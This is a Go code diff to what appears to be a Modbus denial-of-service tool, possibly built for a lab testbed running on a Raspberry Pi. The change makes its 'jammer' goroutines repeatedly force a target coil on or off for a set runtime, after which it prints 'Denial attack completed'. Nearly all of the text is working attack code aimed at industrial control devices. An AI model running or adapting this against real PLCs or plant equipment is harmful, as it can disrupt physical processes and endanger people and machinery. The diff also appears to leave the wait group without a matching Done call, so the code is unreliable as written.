@@ -37,19 +37,27 @@ func timeDelay(timeMin int, ip_address string, jamming int, runtime int, coil ui
 	}()
 }
 
-func jammer(target modbus.Client, coil uint16, coil_value int) {
+func jammer(target modbus.Client, coil uint16, coil_value int, stopChannel chan bool) {
 	for {
-		if coil_value == 1 {
-			results, err := target.WriteSingleCoil(coil, 0xFF00) //Writes a one to coil at position 0. 0xFF00 for 1 and 0x0000 for 0
-			if err != nil {
-				fmt.Println(err)
-				fmt.Println(results)
-			}
-		} else {
-			results, err := target.WriteSingleCoil(coil, 0x0000)
-			if err != nil {
-				fmt.Println(err)
-				fmt.Println(results)
+		select {
+		case <-stopChannel:
+			//fmt.Print("Finished")
+			return
+		default:
+			if coil_value == 1 {
+				results, err := target.WriteSingleCoil(coil, 0xFF00) //Writes a one to coil at position 0. 0xFF00 for 1 and 0x0000 for 0
+				//fmt.Println("Thread still running")
+				if err != nil {
+					fmt.Println(err)
+					fmt.Println(results)
+				}
+			} else {
+				results, err := target.WriteSingleCoil(coil, 0x0000)
+				//fmt.Println("Thread still running")
+				if err != nil {
+					fmt.Println(err)
+					fmt.Println(results)
+				}
 			}
 		}
 	}
@@ -57,16 +65,21 @@ func jammer(target modbus.Client, coil uint16, coil_value int) {
 
 func denial(ip_address string, jamming int, runtime int, coil uint16, coil_val int) {
 	client := modbusConnection(ip_address)
+	stopChannel := make(chan bool)
 	for i := 0; i < jamming; i++ {
 		wait.Add(1)
-		go jammer(client, uint16(coil), coil_val) //If you use modbusConnection(ip_address) instead of client you can crash the pi
+		go jammer(client, uint16(coil), coil_val, stopChannel) //If you use modbusConnection(ip_address) instead of client you can crash the pi
 	}
 
 	timer2 := time.NewTimer(time.Duration(runtime) * time.Minute)
 	go func() {
 		<-timer2.C
 		fmt.Println("Denial attack completed")
+		close(stopChannel)
+
 	}()
+
+	fmt.Println("I am done!")
 	wait.Wait()
 }
 
